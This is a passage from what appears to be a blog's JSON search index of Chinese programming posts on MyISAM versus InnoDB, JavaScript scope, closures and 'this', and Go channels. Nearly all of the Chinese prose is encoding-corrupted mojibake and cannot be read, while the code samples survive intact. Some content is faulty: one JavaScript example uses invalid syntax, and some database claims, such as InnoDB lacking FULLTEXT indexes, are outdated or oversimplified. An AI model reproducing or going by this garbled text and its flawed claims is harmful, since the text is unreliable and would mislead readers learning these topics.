MyISAMæ”¯æŒæ”¯æŒä¸‰ç§ä¸åŒçš„å­˜å‚¨æ ¼å¼ï¼šé™æ€è¡¨(é»˜è®¤ï¼Œä½†æ˜¯æ³¨æ„æ•°æ®æœ«å°¾ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œä¼šè¢«å»æ‰)ã€åŠ¨æ€è¡¨ã€å‹ç¼©è¡¨ã€‚å½“è¡¨åœ¨åˆ›å»ºä¹‹åå¹¶å¯¼å…¥æ•°æ®ä¹‹åï¼Œä¸ä¼šå†è¿›è¡Œä¿®æ”¹æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨å‹ç¼©è¡¨ï¼Œæå¤§çš„å‡å°‘ç£ç›˜çš„ç©ºé—´å ç”¨ã€‚\n\nInnoDBï¼š éœ€è¦æ›´å¤šçš„å†…å­˜å’Œå­˜å‚¨ï¼Œå®ƒä¼šåœ¨ä¸»å†…å­˜ä¸­å»ºç«‹å…¶ä¸“ç”¨çš„ç¼“å†²æ± ç”¨äºé«˜é€Ÿç¼“å†²æ•°æ®å’Œç´¢å¼•ã€‚\n\n\n\n+ å¯ç§»æ¤æ€§ã€å¤‡ä»½åŠæ¢å¤\n\nMyISAMï¼šæ•°æ®æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜å‚¨ï¼Œæ‰€ä»¥åœ¨è·¨å¹³å°çš„æ•°æ®è½¬ç§»ä¸­ä¼šå¾ˆæ–¹ä¾¿ã€‚åœ¨å¤‡ä»½å’Œæ¢å¤æ—¶å¯å•ç‹¬é’ˆå¯¹æŸä¸ªè¡¨è¿›è¡Œæ“ä½œã€‚\n\nInnoDBï¼šå…è´¹çš„æ–¹æ¡ˆå¯ä»¥æ˜¯æ‹·è´æ•°æ®æ–‡ä»¶ã€å¤‡ä»½ binlogï¼Œæˆ–è€…ç”¨ mysqldumpï¼Œåœ¨æ•°æ®é‡è¾¾åˆ°å‡ åGçš„æ—¶å€™å°±ç›¸å¯¹ç—›è‹¦äº†ã€‚\n\n\n\n+ äº‹åŠ¡æ”¯æŒ\n\nMyISAMï¼šå¼ºè°ƒçš„æ˜¯æ€§èƒ½ï¼Œæ¯æ¬¡æŸ¥è¯¢å…·æœ‰åŸå­æ€§,å…¶æ‰§è¡Œæ•°åº¦æ¯”InnoDBç±»å‹æ›´å¿«ï¼Œä½†æ˜¯ä¸æä¾›äº‹åŠ¡æ”¯æŒã€‚\n\nInnoDBï¼šæä¾›äº‹åŠ¡æ”¯æŒäº‹åŠ¡ï¼Œå¤–éƒ¨é”®ç­‰é«˜çº§æ•°æ®åº“åŠŸèƒ½ã€‚ å…·æœ‰äº‹åŠ¡(commit)ã€å›æ»š(rollback)å’Œå´©æºƒä¿®å¤èƒ½åŠ›(crash recovery capabilities)çš„äº‹åŠ¡å®‰å…¨(transaction-safe (ACID compliant))å‹è¡¨ã€‚\n\n\n\n+ AUTO_INCREMENT \n\nMyISAMï¼šå¯ä»¥å’Œå…¶ä»–å­—æ®µä¸€èµ·å»ºç«‹è”åˆç´¢å¼•ã€‚å¼•æ“çš„è‡ªåŠ¨å¢é•¿åˆ—å¿…é¡»æ˜¯ç´¢å¼•ï¼Œå¦‚æœæ˜¯ç»„åˆç´¢å¼•ï¼Œè‡ªåŠ¨å¢é•¿å¯ä»¥ä¸æ˜¯ç¬¬ä¸€åˆ—ï¼Œä»–å¯ä»¥æ ¹æ®å‰é¢å‡ åˆ—è¿›è¡Œæ’åºåé€’å¢ã€‚\n\nInnoDBï¼šInnoDBä¸­å¿…é¡»åŒ…å«åªæœ‰è¯¥å­—æ®µçš„ç´¢å¼•ã€‚å¼•æ“çš„è‡ªåŠ¨å¢é•¿åˆ—å¿…é¡»æ˜¯ç´¢å¼•ï¼Œå¦‚æœæ˜¯ç»„åˆç´¢å¼•ä¹Ÿå¿…é¡»æ˜¯ç»„åˆç´¢å¼•çš„ç¬¬ä¸€åˆ—ã€‚\n\n\n\n+ è¡¨é”å·®å¼‚\n\nMyISAMï¼š åªæ”¯æŒè¡¨çº§é”ï¼Œç”¨æˆ·åœ¨æ“ä½œmyisamè¡¨æ—¶ï¼Œselectï¼Œupdateï¼Œdeleteï¼Œinsertè¯­å¥éƒ½ä¼šç»™è¡¨è‡ªåŠ¨åŠ é”ï¼Œå¦‚æœåŠ é”ä»¥åçš„è¡¨æ»¡è¶³insertå¹¶å‘çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨è¡¨çš„å°¾éƒ¨æ’å…¥æ–°çš„æ•°æ®ã€‚\n\nInnoDBï¼š æ”¯æŒäº‹åŠ¡å’Œè¡Œçº§é”ï¼Œæ˜¯innodbçš„æœ€å¤§ç‰¹è‰²ã€‚è¡Œé”å¤§å¹…åº¦æé«˜äº†å¤šç”¨æˆ·å¹¶å‘æ“ä½œçš„æ–°èƒ½ã€‚ä½†æ˜¯InnoDBçš„è¡Œé”ï¼Œåªæ˜¯åœ¨WHEREçš„ä¸»é”®æ˜¯æœ‰æ•ˆçš„ï¼Œéä¸»é”®çš„WHEREéƒ½ä¼šé”å…¨è¡¨çš„ã€‚\n\n\n\n+ å…¨æ–‡ç´¢å¼•\n\nMyISAMï¼šæ”¯æŒ FULLTEXTç±»å‹çš„å…¨æ–‡ç´¢å¼•\n\nInnoDBï¼šä¸æ”¯æŒFULLTEXTç±»å‹çš„å…¨æ–‡ç´¢å¼•ï¼Œä½†æ˜¯innodbå¯ä»¥ä½¿ç”¨sphinxæ’ä»¶æ”¯æŒå…¨æ–‡ç´¢å¼•ï¼Œå¹¶ä¸”æ•ˆæœæ›´å¥½ã€‚\n\n\n\n+ è¡¨ä¸»é”®\n\nMyISAMï¼šå…è®¸æ²¡æœ‰ä»»ä½•ç´¢å¼•å’Œä¸»é”®çš„è¡¨å­˜åœ¨ï¼Œç´¢å¼•éƒ½æ˜¯ä¿å­˜è¡Œçš„åœ°å€ã€‚\n\nInnoDBï¼šå¦‚æœæ²¡æœ‰è®¾å®šä¸»é”®æˆ–è€…éç©ºå”¯ä¸€ç´¢å¼•ï¼Œå°±ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª6å­—èŠ‚çš„ä¸»é”®(ç”¨æˆ·ä¸å¯è§)ï¼Œæ•°æ®æ˜¯ä¸»ç´¢å¼•çš„ä¸€éƒ¨åˆ†ï¼Œé™„åŠ ç´¢å¼•ä¿å­˜çš„æ˜¯ä¸»ç´¢å¼•çš„å€¼ã€‚\n\n\n\n+ è¡¨çš„å…·ä½“è¡Œæ•°\n\nMyISAMï¼š ä¿å­˜æœ‰è¡¨çš„æ€»è¡Œæ•°ï¼Œå¦‚æœselect count(*) from table;ä¼šç›´æ¥å–å‡ºå‡ºè¯¥å€¼ã€‚*\n\nInnoDBï¼š æ²¡æœ‰ä¿å­˜è¡¨çš„æ€»è¡Œæ•°ï¼Œå¦‚æœä½¿ç”¨select count(*) from tableï¼›å°±ä¼šéå†æ•´ä¸ªè¡¨ï¼Œæ¶ˆè€—ç›¸å½“å¤§ï¼Œä½†æ˜¯åœ¨åŠ äº†wehreæ¡ä»¶åï¼Œmyisamå’Œinnodbå¤„ç†çš„æ–¹å¼éƒ½ä¸€æ ·ã€‚\n\n\n\n+ CRUDæ“ä½œ\n\nMyISAMï¼šå¦‚æœæ‰§è¡Œå¤§é‡çš„SELECTï¼ŒMyISAMæ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚\n\nInnoDBï¼šå¦‚æœä½ çš„æ•°æ®æ‰§è¡Œå¤§é‡çš„INSERTæˆ–UPDATEï¼Œå‡ºäºæ€§èƒ½æ–¹é¢çš„è€ƒè™‘ï¼Œåº”è¯¥ä½¿ç”¨InnoDBè¡¨ã€‚\n\n\n\n+ å¤–é”®\n\nMyISAMï¼šä¸æ”¯æŒ\n\nInnoDBï¼šæ”¯æŒ\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ [MySQLå­˜å‚¨å¼•æ“ï¼ï¼MyISAMä¸InnoDBåŒºåˆ«](https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000008227211)\n\n","tags":["mysql"],"categories":["sql"]},{"title":"javascriptä½œç”¨åŸŸ,ä¸Šä¸‹æ–‡ç¯å¢ƒ,è‡ªç”±å˜é‡ä»¥åŠé—­åŒ…","url":"%2Fp%2F1e35a583.html","content":"\n\n\n### javascript çš„ä½œç”¨åŸŸ\n\n+ åœ¨ javascript ä¸­, æ²¡æœ‰å—çº§çš„ä½œç”¨åŸŸ (åäººç±»),  æ‰€ä»¥ä¸ºäº†é¿å…è¯¯è§£, æœ€å¥½ä¸è¦åœ¨å—ä½œç”¨åŸŸå†…å£°æ˜å˜é‡\n\n```javascript\nvar i = 10;\nif i > 1 {\n    var name = \"levon\";\n}\nconsole.log(name);//levon\n```\n\n+ é™¤äº†å…¨å±€ä½œç”¨åŸŸ, åªæœ‰å‡½æ•°æ‰å¯ä»¥åˆ›å»ºä½œç”¨åŸŸ\n+ ä½œç”¨åŸŸæœ‰ä¸Šä¸‹çº§å…³ç³», æœ€å¤§çš„ç›®çš„å°±æ˜¯éš”ç¦»å˜é‡, ä¸åŒä½œç”¨åŸŸä¸‹åŒåå˜é‡ä¹Ÿä¸ä¼šå†²çª\n\n```javascript\nvar a = 10; //window.a = 10; å…¨å±€ä½œç”¨åŸŸ\n\nfunction fn(){\n    var a = 100; //fn ä½œç”¨åŸŸ\n    \n    function bar(){\n        var a = 1000; //bar ä½œç”¨åŸŸ\n    }\n}\n```\n\n<!-- more -->\n\n### javascript çš„ä½œç”¨åŸŸå’Œæ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒ\n\n- ä½œç”¨åŸŸåªæ˜¯ä¸€ä¸ªâ€œåœ°ç›˜â€ï¼Œä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µã€‚\n- å¦‚æœè¦æŸ¥æ‰¾ä¸€ä¸ªä½œç”¨åŸŸä¸‹æŸä¸ªå˜é‡çš„å€¼ï¼Œå°±éœ€è¦æ‰¾åˆ°è¿™ä¸ªä½œç”¨åŸŸå¯¹åº”çš„æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå†åœ¨å…¶ä¸­å¯»æ‰¾å˜é‡çš„å€¼ã€‚\n- ä½œç”¨åŸŸä¸­å˜é‡çš„å€¼æ˜¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„ç¡®å®šçš„ï¼Œè€Œä½œç”¨åŸŸå´æ˜¯åœ¨å‡½æ•°åˆ›å»ºæ—¶å°±ç¡®å®šäº†ã€‚\n- åŒä¸€ä¸ªä½œç”¨åŸŸä¸‹ï¼Œä¸åŒçš„è°ƒç”¨ä¼šäº§ç”Ÿä¸åŒçš„æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œç»§è€Œäº§ç”Ÿä¸åŒçš„å˜é‡çš„å€¼ã€‚\n\n\n\n### ä½œç”¨åŸŸå’Œä¸Šä¸‹æ–‡ç¯å¢ƒç»å¯¹ä¸æ˜¯ä¸€å›äº‹å„¿\n\n+ ä½œç”¨åŸŸ:\n\né¦–å…ˆï¼Œå®ƒå¾ˆæŠ½è±¡ã€‚å¦å¤–é™¤äº†å…¨å±€ä½œç”¨åŸŸï¼Œåªæœ‰å‡½æ•°æ‰èƒ½åˆ›å»ºä½œç”¨åŸŸã€‚åˆ›å»ºä¸€ä¸ªå‡½æ•°å°±åˆ›å»ºäº†ä¸€ä¸ªä½œç”¨åŸŸï¼Œæ— è®ºä½ è°ƒç”¨ä¸è°ƒç”¨ï¼Œå‡½æ•°åªè¦åˆ›å»ºäº†ï¼Œå®ƒå°±æœ‰ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œå°±æœ‰è‡ªå·±çš„ä¸€ä¸ªâ€œåœ°ç›˜â€ã€‚\n\n+ ä¸Šä¸‹æ–‡ç¯å¢ƒ:\n\nå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªçœ‹ä¸è§æ‘¸ä¸ç€çš„å¯¹è±¡ï¼ˆæœ‰è‹¥å¹²ä¸ªå±æ€§ï¼‰ï¼Œè™½ç„¶çœ‹ä¸è§æ‘¸ä¸ç€ï¼Œä½†ç¡®å®å®å®åœ¨åœ¨å­˜åœ¨çš„ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡éƒ½åœ¨é‡Œé¢å­˜å‚¨ç€ï¼Œè¦ä¸ç„¶å’±ä»¬å®šä¹‰çš„å˜é‡åœ¨å“ªé‡Œå­˜ï¼Ÿ\n\nå¦å¤–ï¼Œå¯¹äºå‡½æ•°æ¥è¯´ï¼Œä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯åœ¨è°ƒç”¨æ—¶åˆ›å»ºçš„ï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£ã€‚æ‹¿å‚æ•°åšä¾‹å­ï¼Œä½ ä¸è°ƒç”¨å‡½æ•°ï¼Œæˆ‘å“ªå„¿çŸ¥é“ä½ è¦ç»™æˆ‘ä¼ ä»€ä¹ˆå‚æ•°ï¼Ÿ\n\n+ ä¸¤è€…ä¹‹é—´çš„å…³ç³»:\n\nä¸€ä¸ªä½œç”¨åŸŸä¸‹å¯èƒ½åŒ…å«è‹¥å¹²ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒã€‚æœ‰å¯èƒ½ä»æ¥æ²¡æœ‰è¿‡ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆå‡½æ•°ä»æ¥å°±æ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼‰ï¼›æœ‰å¯èƒ½æœ‰è¿‡ï¼Œç°åœ¨å‡½æ•°è¢«è°ƒç”¨å®Œæ¯•åï¼Œä¸Šä¸‹æ–‡ç¯å¢ƒè¢«é”€æ¯äº†ï¼›æœ‰å¯èƒ½åŒæ—¶å­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªï¼ˆé—­åŒ…ï¼‰ã€‚\n\n```javascript\nvar x = 100;\nfunction fn(x){\n    return function(){\n        console.log(x);\n    }\n}\n\nvar f1 = fn(5);\nvar f2 = fn(10);\n\nf1();//5\nf2();//10\n```\n\nä¸Šé¢ä»£ç ä¸€ä¸ªfnä½œç”¨åŸŸä¸‹åŒæ—¶å­˜åœ¨ä¸¤ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒã€‚å¯ä»¥ç†è§£ä½œç”¨åŸŸæ˜¯é™æ€çš„ç»„ç»‡ç»“æ„ï¼Œè€Œä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯åŠ¨æ€çš„è°ƒç”¨ã€‚\n\n\n\n### è‡ªç”±å˜é‡ä¾èµ–é™æ€ä½œç”¨åŸŸ\n\n- åœ¨ Aä½œç”¨åŸŸä¸­ä½¿ç”¨çš„å˜é‡ x, å´æ²¡æœ‰åœ¨ Aä½œç”¨åŸŸä¸­å£°æ˜(å³åœ¨å…¶ä»–ä½œç”¨åŸŸä¸­å£°æ˜çš„), é‚£ä¹ˆå¯¹äº Aä½œç”¨åŸŸæ¥è¯´, x å°±æ˜¯ä¸€ä¸ªè‡ªç”±å˜é‡.\n\n```javascript\nvar x = 10;\nfunction fn(){\n    var b = 20;\n    console.log(x + b); //è¿™é‡Œçš„ x å°±æ˜¯ä¸€ä¸ªè‡ªç”±å˜é‡\n}\n```\n\n- é‚£ä¹ˆå»å“ªé‡Œå–è‡ªç”±å˜é‡çš„å€¼?  è¦åˆ° åˆ›å»º åŒ…å«è‡ªç”±å˜é‡ å‡½æ•° çš„é‚£ä¸ª ä½œç”¨åŸŸ ä¸­å–å€¼â€”â€”æ˜¯â€œåˆ›å»ºâ€ï¼Œè€Œä¸æ˜¯â€œè°ƒç”¨â€. ä¸€å®šè¦åˆ‡è®°å…¶å®è¿™å°±æ˜¯æ‰€è°“çš„â€œé™æ€ä½œç”¨åŸŸâ€ã€‚\n\n- é‚£ä¹ˆåœ¨æ‰§è¡Œ fn çš„æ—¶å€™, x å–å€¼å»å“ªé‡Œå–å‘¢?  ç­”æ¡ˆæ˜¯è¦åˆ°åˆ›å»ºfnå‡½æ•°çš„é‚£ä¸ªä½œç”¨åŸŸä¸­å–â€”â€”>æ— è®ºfnå‡½æ•°å°†åœ¨å“ªé‡Œè°ƒç”¨ã€‚(anywhere call, only find on create)\n\n- å¦‚æœé™æ€ä½œç”¨åŸŸæ‰¾ä¸åˆ°æ€ä¹ˆåŠ? æ­¤æ—¶å°±éœ€è¦ä¸€çº§ä¸€çº§è·¨ä½œç”¨åŸŸä¸€ç›´æ‰¾åˆ°å…¨å±€ä½œç”¨åŸŸ\n\n```javascript\nvar a = 10;\n\nfunction fn(){\n    var b = 20; // å¦‚æœæ­¤å¤„æ²¡æœ‰20, b å°±ä¼šæ‰¾åˆ°200\n    \n    function bar(){\n        console.log(a + b);// a ä¸€ç›´è·¨åˆ°å…¨å±€ä½œç”¨åŸŸæ‰¾åˆ°, b ç›´æ¥åœ¨ fn ä½œç”¨åŸŸæ‰¾åˆ°,  \n    }\n    \n    return bar;\n}\n\nvar x = fn();\nvar b = 200;\nx();\n```\n\n\n\næ¥çœ‹ä¸€é“é¢˜:\n\n```javascript\nvar x = 10;\n\nfunction show(){\n\n\tfunction fn(){\n\t\tconsole.log(x);\n\t}\n\n    var x = 20;\n\n\t(function(){\n\t\tvar x = 30;\n\t\tfn();\n\t})();\n}\n\nshow();//ç­”æ¡ˆæ˜¯20, æƒ³æƒ³ä¸ºä»€ä¹ˆ\n```\n\n\n\n### é—­åŒ…å…¶å®å°±æ˜¯ä¸Šä¸‹æ–‡ç¯å¢ƒä¸é”€æ¯\n\né—­åŒ…ä¸€èˆ¬åªæœ‰ä¸¤ç§æƒ…å†µâ€”â€”å‡½æ•°ä½œä¸ºè¿”å›å€¼ï¼Œå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ã€‚\n\n```javascript\nfunction fn(){\n    var max = 10;\n    \n    return function bar(x){\n        if (x > max){\n            console.log(x);\n        }\n    };\n}\n\nvar f1 = fn();\nvar max = 100;\nf1(15);\n```\n\n\n\n+ å…¨å±€ä¸Šä¸‹æ–‡ç¯å¢ƒå‡†å¤‡,   global â€”>  f1 = undefined, max = undefined\n+ æ‰§è¡Œåˆ° var f1 = fn();  è¿›å…¥fn()æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒ.    fn â€”> max = 10\n+ fn() å‡½æ•°è¿”å›, æœ¬æ¥è¦é”€æ¯ä¸Šä¸‹æ–‡çš„max,  ä½†æ˜¯ bar å‡½æ•°å´å¼•ç”¨äº†è¿™ä¸ªmax, å› æ­¤è¿™ä¸ªmaxä¸èƒ½è¢«é”€æ¯ï¼Œé”€æ¯äº†barå‡½æ•°ä¸­çš„maxå°±æ‰¾ä¸åˆ°å€¼äº†ã€‚æ‰€ä»¥fn()ä¸Šä¸‹æ–‡ç¯å¢ƒä¿ç•™.  fn â€”> max = 10\n+ var max = 100;    global â€”> f1 = fn(), max = 100\n+ f1(15)  è¿›å…¥fnæ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒ, max æ˜¯10,  x æ˜¯15, è¾“å‡º15\n+ æ‰§è¡Œå®Œæ¯•è¿›å…¥å…¨å±€ä¸Šä¸‹æ–‡ç¯å¢ƒ\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascriptæ‰§è¡Œä¸Šä¸‹æ–‡çš„å‡†å¤‡å·¥ä½œ","url":"%2Fp%2Fcfbcfff.html","content":"\n\n\n### å…¨å±€ä¸Šä¸‹æ–‡çš„å‡†å¤‡å·¥ä½œ:\n\nå…¨å±€ç¯å¢ƒä¸‹ javascriptçœŸæ­£è¿è¡Œè¯­å¥ä¹‹å‰, è§£é‡Šå™¨ä¼šåšä¸€äº›å‡†å¤‡å·¥ä½œ:\n\n- å¯¹å˜é‡çš„å£°æ˜ (è€Œå˜é‡çš„èµ‹å€¼, æ˜¯çœŸæ­£è¿è¡Œåˆ°é‚£ä¸€è¡Œçš„æ—¶å€™æ‰è¿›è¡Œçš„.)\n- å¯¹å…¨å±€å˜é‡ this çš„èµ‹å€¼\n- å¯¹å‡½æ•°å£°æ˜èµ‹å€¼, å¯¹å‡½æ•°è¡¨è¾¾å¼å£°æ˜\n\n\n\nå¦‚ä½•ç†è§£è¿™ä¸‰ç§æƒ…å†µå‘¢?\n\n1. å¯¹å˜é‡çš„å£°æ˜:\n\n```javascript\nconsole.log(a); // undefined\nvar a = 10;\n```\n\nå‡†å¤‡å·¥ä½œæ˜¯æå‰å£°æ˜äº†å˜é‡ a, å’Œä¸‹é¢å†™æ³•æ„æ€ä¸€æ ·\n\n```javascript\nvar a; \nconsole.log(a); // undefined\na = 10;\n```\n\n<!-- more -->\n\n2. å¯¹å…¨å±€å˜é‡ this çš„èµ‹å€¼:\n\n```javascript\nconsole.log(this) // window\n```\n\næ‰§è¡Œå‰çš„å‡†å¤‡å·¥ä½œæ˜¯:  this èµ‹å€¼ä¸ºå…¨å±€çš„ window å¯¹è±¡\n\n\n\n3. å¯¹å‡½æ•°å£°æ˜èµ‹å€¼, å¯¹å‡½æ•°è¡¨è¾¾å¼å£°æ˜:\n\n```javascript\nconsole.log(f1);// function f1() {}\nfunction f1() {} //è¿™ä¸ªæ˜¯å‡½æ•°å£°æ˜\n\nconsole.log(f2);  // undefined\nvar f2 = function(){}; //è¿™ä¸ªæ˜¯å‡½æ•°è¡¨è¾¾å¼\n```\n\næ‰§è¡Œå‰çš„å‡†å¤‡å·¥ä½œæ˜¯:  å‡½æ•°å£°æ˜ f1 è¢«èµ‹å€¼, å‡½æ•°è¡¨è¾¾å¼ f2 è¢«å£°æ˜\n\n\n\n### å‡½æ•°ä¸Šä¸‹æ–‡é¢å¤–çš„å‡†å¤‡å·¥ä½œ:\n\n1. å‡½æ•°å®šä¹‰æ—¶, é¢å¤–çš„å‡†å¤‡å·¥ä½œ:\n\n- è®°å½•å‡½æ•°å†…è‡ªç”±å˜é‡çš„ä½œç”¨åŸŸ.  (è‡ªç”±å˜é‡å°±æ˜¯å¼•ç”¨å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡)\n\n```javascript\nvar a = 10;\nfunction fn (){\n    console.log(a); // aæ˜¯è‡ªç”±å˜é‡,æ­¤å¤„å®šä¹‰æ—¶å°±è®°å½•äº†aè¦å–å€¼çš„ä½œç”¨åŸŸ,å³å…¨å±€ä½œç”¨åŸŸ\n}\n\nfunction bar(f){\n    var a = 20;\n    f(); // è¾“å‡º10, è€Œä¸æ˜¯20, å› ä¸ºfnå‡½æ•°å†…è‡ªç”±å˜é‡ a çš„ä½œç”¨åŸŸæ—©è¢«è®°å½•ä¸‹æ¥äº†,æ˜¯å¤–é¢çš„10\n}\nbar(fn)\n```\n\n\n\n2. å‡½æ•°è°ƒç”¨æ—¶, é¢å¤–çš„å‡†å¤‡å·¥ä½œ:\n\n- arguments å˜é‡çš„èµ‹å€¼\n- å‡½æ•°å‚æ•°çš„èµ‹å€¼\n\n```javascript\nfunction fn(x){\n    console.log(arguments); // [10]\n    console.log(x); // 10\n}\nfn(10);\n```\n\n\n\n### æ¥çœ‹ä¸€é“é¢˜:\n\n```javascript\nvar a = 'global';\nvar f = function(){\n    console.log(a); // ç­”æ¡ˆæ˜¯undefined, æƒ³æƒ³ä¸ºä»€ä¹ˆ\n    var a = 'local';\n}\nf();\n```\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascriptçš„thisç©¶ç«ŸæŒ‡ä»€ä¹ˆ","url":"%2Fp%2Fd14f4ebd.html","content":"\n\n\nåœ¨å­¦ä¹  javascript çš„ thisä¹‹å‰, æˆ‘ä»¬éœ€è¦å…ˆæ˜ç¡®ä¸€ä¸ªé‡è¦çŸ¥è¯†:\n\n> åœ¨å‡½æ•°ä¸­thisåˆ°åº•å–ä½•å€¼ï¼Œæ˜¯åœ¨å‡½æ•°çœŸæ­£è¢«è°ƒç”¨æ‰§è¡Œçš„æ—¶å€™ç¡®å®šçš„ï¼Œå‡½æ•°å®šä¹‰çš„æ—¶å€™ç¡®å®šä¸äº†ã€‚\n>\n> ç®€å•è®°å¿†æ˜¯ï¼Œè°è°ƒç”¨çš„å‡½æ•°ï¼Œthiså°±æŒ‡å‘è°.\n\n\n\nåœ¨ javascript ä¸­, thisçš„å–å€¼ï¼Œä¸€èˆ¬åˆ†ä¸ºä¸‹é¢å‡ ç§æƒ…å†µã€‚\n\n### ä¸€.  æ„é€ å‡½æ•°\n\n+ new å‡ºçš„å¯¹è±¡:\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // å½“å‰æ„é€ çš„å¯¹è±¡\n}\n\nvar f1 = new Foo();\n```\n\n\n\n+ ç›´æ¥è¿è¡Œå‡½æ•°(æ™®é€šå‡½æ•°ä½¿ç”¨):\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // ç›´æ¥è°ƒç”¨æ³¨æ„æ­¤å¤„æ˜¯ window\n}\n\nFoo();// window.Foo();\n```\n\n<!-- more -->\n\n### äºŒ.  å‡½æ•°ä½œä¸ºå¯¹è±¡çš„å±æ€§\n\n+ å¯¹è±¡è°ƒç”¨æœ¬èº«çš„å‡½æ•°:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // æ­¤å¤„å°±æ˜¯ obj\n        console.log(this.x);//10\n    }\n}\n\nobj.fn();\n```\n\n\n\n+ å¦‚æœä¸ç”¨å¯¹è±¡å»è°ƒç”¨:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // window\n        console.log(this.x);// undefined\n    }\n}\n\nvar fn1 = obj.fn;\nfn1();//window.fn1();\n\n```\n\n\n\n+ éœ€è¦æ³¨æ„çš„ä¸€ç§æƒ…å†µæ˜¯ä¸‹é¢çš„ f()å‡½æ•°, æ­¤æ—¶ f()åªæ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°\n\n```javascript\nvar obj = {\n\tx : 10,\n\tfn : function(){\n\t\t\n        this;// æ­¤å¤„æ˜¯ obj\n        \n\t\tfunction f(){\n\t\t\tconsole.log(this); // window\n\t\t\tconsole.log(this.x);// undefined\n\t\t}\n\t\tf();\n        \n\t}\n}\n\nobj.fn();\n```\n\n  \n\n### ä¸‰: å‡½æ•°ç”¨ call æˆ– apply è°ƒç”¨\n\n+ å‡½æ•°è°ƒç”¨ call\n\n```javascript\nvar obj = {\n    x : 10\n};\n\nvar fn = function(){\n    console.log(this);  //å‡½æ•°è°ƒç”¨call, thisæŒ‡å‘callä¸­çš„å‚æ•°, å°±æ˜¯obj\n    console.log(this.x);// 10\n}\n\nfn.call(obj)\n```\n\n\n\n### å››:  å…¨å±€ç¯å¢ƒä¸‹çš„ this\n\n```javascript\nconsole.log(this); // window\n\n\nvar x = 10; //--> window.x = 10\nvar fn = function(){\n    console.log(this); //window\n    console.log(this.x)//10\n}\nfn();// window.fn();\n```\n\n\n\n### äº”: åŸå‹é“¾ä¸­çš„ this\n\n```javascript\nfunction Fn(){\n    this.name = \"levon\";\n}\n\nFn.prototype.getName = function(){\n    console.log(this.name); //æ­¤å¤„ this æ˜¯è°ƒç”¨çš„å½“å‰å¯¹è±¡ f1\n}\n\nvar f1 = new Fn();\nf1.getName(); //levon\n```\n\n\n\nå…¶å®ä¸ä»…ä»…æ˜¯æ„é€ å‡½æ•°çš„prototypeï¼Œå³ä¾¿æ˜¯åœ¨æ•´ä¸ªåŸå‹é“¾ä¸­ï¼Œthisä»£è¡¨çš„ä¹Ÿéƒ½æ˜¯å½“å‰å¯¹è±¡çš„å€¼ã€‚","tags":["javascript"],"categories":["javascript"]},{"title":"golangå¸¸é—®çš„çŸ¥è¯†ç‚¹","url":"%2Fp%2F19ae52d4.html","content":"\n\n\n# 1. channel\n\n### 1.1 å…³é—­æœ‰ç¼“å†²æ•°æ®çš„ channel, è¿˜èƒ½è¯»å–å—\n\nåªæœ‰å½“channelæ— æ•°æ®ï¼Œä¸”channelè¢«closeäº†ï¼Œæ‰ä¼šè¿”å›ok=falseã€‚ åªè¦æœ‰å †ç§¯æ•°æ®ï¼Œå³ä½¿ close() ä¹Ÿä¸ä¼šè¿”å›å…³é—­çŠ¶æ€ã€‚\n\nå…³é—­åæœ‰æ•°æ®ä¹Ÿèƒ½ä»é‡Œé¢å¾—åˆ°æ•°æ®ï¼Œé™¤éæ¶ˆè€—ç©ºäº†ã€‚\n\n<!-- more -->\n\n```go\nfunc main() {\n\n\tc := make(chan int, 10)\n\tc <- 1\n\tc <- 2\n\tc <- 3\n\tclose(c)\n\n\tfor {\n\t\tdata, ok := <-c\n\t\tif !ok {\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(data, ok)\n\t}\n}\n\n/*\n1 true\n2 true\n3 true\n*/\n```\n\n\n\n### 1.2 channel è¢«closeåï¼Œè¿˜èƒ½è¢«æ¥æ”¶æˆ– select å—\n\n+ å¦‚æœæœ‰ç¼“å­˜ï¼Œå€¼èƒ½è¢«æ”¶åˆ°ï¼Œok æ˜¯ true\n\n+ å¦‚æœæ— ç¼“å­˜ï¼Œå€¼æ˜¯0ï¼Œok æ˜¯ falseï¼Œä½†ä¸ä¼š panic\n+ å…³é—­å, å°±æ˜¯ä½ å¯ä»¥è¯», ä½†æ˜¯ä¸èƒ½å†™\n\n\n\n### 1.3 å¦‚ä½•åˆ¤æ–­channelå·²ç»å…³é—­äº† ï¼Ÿ\n\n+ Go ä¸­æ²¡æœ‰ä¸€ä¸ªå…§å»ºå‡½æ•°å»æ£€æµ‹ç®¡é“æ˜¯å¦å·²ç»è¢«å…³é—­.\n+ 